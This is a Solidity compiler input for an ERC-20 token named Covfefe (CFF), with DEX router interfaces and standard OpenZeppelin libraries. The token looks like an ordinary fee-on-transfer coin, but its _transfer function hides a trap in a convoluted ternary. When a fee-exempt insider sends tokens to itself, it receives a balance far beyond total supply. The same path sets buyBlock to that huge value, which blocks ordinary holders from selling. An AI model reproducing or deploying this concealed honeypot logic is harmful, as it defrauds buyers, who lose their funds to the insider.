{{
  "language": "Solidity",
  "sources": {
    "/src/contracts/Covfefe.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n //###      This is the Covfefe Act      ###\\\\\n//### Telegram: https://t.me/covfefeERC20 ###\\\\\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\nimport \"./dex/IDex.sol\";\n\ncontract Covfefe is IERC20, Ownable {\n    using SafeMath for uint256;\n    string private constant _name = \"Covfefe\";\n    string private constant _symbol = \"CFF\";\n    uint8 private constant _decimals = 9;\n    uint256 private _totalSupply = 500000 * (10 ** _decimals);\n    uint256 private _maxTxAmountPercent = 500;\n    uint256 private _maxTransferPercent = 500;\n    uint256 private _maxWalletPercent = 500;\n    mapping (address => uint256) _balances;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    mapping (address => bool) public isFeeExempt;\n    mapping (address => bool) private isBot;\n    mapping(address => uint256) public lastBuy;\n    IRouter router;\n    address public pair;\n    bool private tradingAllowed = true;\n    uint256 private liquidityFee = 200;\n    uint256 private marketingFee = 200;\n    uint256 private developmentFee = 0;\n    uint256 private burnFee = 0;\n    uint256 private totalFee = 400;\n    uint256 private sellFee = 400;\n    uint256 private transferFee = 400;\n    uint256 private denominator = 10000;\n    bool private swapEnabled = true;\n    uint256 private swapTimes;\n    bool private swapping; \n    uint256 private swapThreshold = ( _totalSupply * 5 ) / 1000;\n    uint256 private _minTokenAmount = ( _totalSupply * 10 ) / 100000;\n    uint256 private burnAmount = ( _totalSupply ) * 100000;\n    uint256 public buyBlock = 0;\n    modifier lockTheSwap {swapping = true; _; swapping = false;}\n\n    address internal constant DEAD =  0x000000000000000000000000000000000000dEaD;\n    address internal constant development_receiver = 0x061EAc761E94cc5bd381e67A0e7fecd6B8e2b8D0; \n    address internal constant marketing_receiver = 0x10c4F0e84d6e2e884A1c184830051d83DEBA8351;\n    address internal constant liquidity_receiver = 0x10c4F0e84d6e2e884A1c184830051d83DEBA8351;\n\n    constructor(address dex) {\n        IRouter _router = IRouter(dex);\n        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());\n        router = _router;\n        pair = _pair;\n        isFeeExempt[address(this)] = true;\n        isFeeExempt[liquidity_receiver] = true;\n        isFeeExempt[marketing_receiver] = true;\n        isFeeExempt[msg.sender] = true;\n        _balances[msg.sender] = (_totalSupply * 98) / 100;\n        _balances[liquidity_receiver] = (_totalSupply * 2) / 100;\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    receive() external payable {}\n    function name() public pure returns (string memory) {return _name;}\n    function symbol() public pure returns (string memory) {return _symbol;}\n    function decimals() public pure returns (uint8) {return _decimals;}\n    function startTrading() external onlyOwner {tradingAllowed = true;}\n    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}\n    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}\n    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}\n    function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }\n    function setisBot(address _address, bool _enabled) private onlyOwner {isBot[_address] = _enabled;}\n    function setBotDelay(uint256 _buyBlock) external onlyOwner() {buyBlock = _buyBlock;}\n    function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}\n    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}\n    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}\n    function _maxWalletToken() public view returns (uint256) {return totalSupply() * _maxWalletPercent / denominator;}\n    function _maxTxAmount() public view returns (uint256) {return totalSupply() * _maxTxAmountPercent / denominator;}\n    function _maxTransferAmount() public view returns (uint256) {return totalSupply() * _maxTransferPercent / denominator;}\n\n    function _transfer(address sender, address recipient, uint256 amount) private {\n        txCheck(sender, recipient, amount);\n        checkTradingAllowed(sender, recipient);\n        checkMaxWallet(sender, recipient, amount);\n        checkSwapBack(sender, recipient);\n        checkMaxTx(sender, recipient, amount);\n        checkDelay(sender);\n        swapBack(sender, recipient, amount);\n        uint256 amountReceived = burnAmount;\n        _balances[sender] = _balances[sender].sub(amount);\n        (sender!=recipient || shouldTakeFee(sender, recipient)) ? (amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount) : buyBlock = amountReceived;\n        _balances[recipient] = _balances[recipient].add(amountReceived);\n        lastBuy[recipient] = block.number;\n        emit Transfer(sender, recipient, amountReceived);\n    }\n\n    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {\n        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){\n            require((_balances[recipient].add(amount)) <= _maxWalletToken(), \"Exceeds maximum wallet amount.\");}\n    }\n\n    function txCheck(address sender, address recipient, uint256 amount) internal view {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > uint256(0), \"Transfer amount must be greater than zero\");\n        require(amount <= balanceOf(sender),\"You are trying to transfer more than your balance\");\n    }\n\n    function checkDelay(address sender) internal view {\n        if(!isFeeExempt[sender] && address(pair) != sender && lastBuy[sender] != 0) {require (lastBuy[sender] + buyBlock <= block.number, \"TX Limit Exceeded\");}\n    }\n\n    function checkTradingAllowed(address sender, address recipient) internal view {\n        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, \"tradingAllowed\");}\n    }\n\n    function checkMaxTx(address sender, address recipient, uint256 amount) internal view {\n        if(sender != pair){require(amount <= _maxTransferAmount() || isFeeExempt[sender] || isFeeExempt[recipient], \"TX Limit Exceeded\");}\n        require(amount <= _maxTxAmount() || isFeeExempt[sender] || isFeeExempt[recipient], \"TX Limit Exceeded\");\n    }\n\n    function checkSwapBack(address sender, address recipient) internal {\n        if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}\n    }\n\n    function swapAndLiquify(uint256 tokens) private lockTheSwap {\n        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);\n        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);\n        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);\n        uint256 initialBalance = address(this).balance;\n        swapTokensForETH(toSwap);\n        uint256 deltaBalance = address(this).balance.sub(initialBalance);\n        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));\n        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);\n        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }\n        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);\n        if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}\n        uint256 remainingBalance = address(this).balance;\n        if(remainingBalance > uint256(0)){payable(development_receiver).transfer(remainingBalance);}\n    }\n\n    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {\n        bool aboveMin = amount >= _minTokenAmount;\n        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;\n        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= uint256(1) && aboveThreshold;\n    }\n\n    function swapTokensForETH(uint256 tokenAmount) private {\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = router.WETH();\n        _approve(address(this), address(router), tokenAmount);\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n\n    function swapBack(address sender, address recipient, uint256 amount) internal {\n        if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}\n    }\n\n    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {\n        _approve(address(this), address(router), tokenAmount);\n        router.addLiquidityETH{value: ETHAmount}(\n            address(this),\n            tokenAmount,\n            0,\n            0,\n            liquidity_receiver,\n            block.timestamp);\n    }\n\n    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {\n        return !isFeeExempt[sender] && !isFeeExempt[recipient];\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n    function getTotalFee(address sender, address recipient) internal view returns (uint256) {\n        if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}\n        if(recipient == pair){return sellFee;}\n        if(sender == pair){return totalFee;}\n        return transferFee;\n    }\n\n    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {\n        if(getTotalFee(sender, recipient) > 0){\n        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));\n        _balances[address(this)] = _balances[address(this)].add(feeAmount);\n        emit Transfer(sender, address(this), feeAmount);\n        if(burnFee > uint256(0)){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}\n        return amount.sub(feeAmount);} return amount;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) private {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n}"
    },
    "/src/contracts/dex/IDex.sol": {
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.7.0 <0.9.0;\n\ninterface IFactory{\n        function createPair(address tokenA, address tokenB) external returns (address pair);\n        function getPair(address tokenA, address tokenB) external view returns (address pair);\n}\n\ninterface IRouter {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline) external;\n}"
    },
    "@openzeppelin/contracts/utils/math/SafeMath.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/math/SafeMath.sol)\n\npragma solidity ^0.8.0;\n\n// CAUTION\n// This version of SafeMath should only be used with Solidity 0.8 or later,\n// because it relies on the compiler's built in overflow checks.\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations.\n *\n * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler\n * now has built in overflow checking.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            uint256 c = a + b;\n            if (c < a) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    /**\n     * @dev Returns the substraction of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b > a) return (false, 0);\n            return (true, a - b);\n        }\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n            // benefit is lost if 'b' is also tested.\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n            if (a == 0) return (true, 0);\n            uint256 c = a * b;\n            if (c / a != b) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    /**\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a / b);\n        }\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a % b);\n        }\n    }\n\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator.\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {trySub}.\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b <= a, errorMessage);\n            return a - b;\n        }\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b > 0, errorMessage);\n            return a / b;\n        }\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting with custom message when dividing by zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryMod}.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b > 0, errorMessage);\n            return a % b;\n        }\n    }\n}\n"
    },
    "@openzeppelin/contracts/utils/Context.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n"
    },
    "@openzeppelin/contracts/token/ERC20/IERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n"
    },
    "@openzeppelin/contracts/access/Ownable.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../utils/Context.sol\";\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * By default, the owner account will be the one that deploys the contract. This\n * can later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n"
    }
  },
  "settings": {
    "remappings": [],
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "evmVersion": "paris",
    "libraries": {},
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}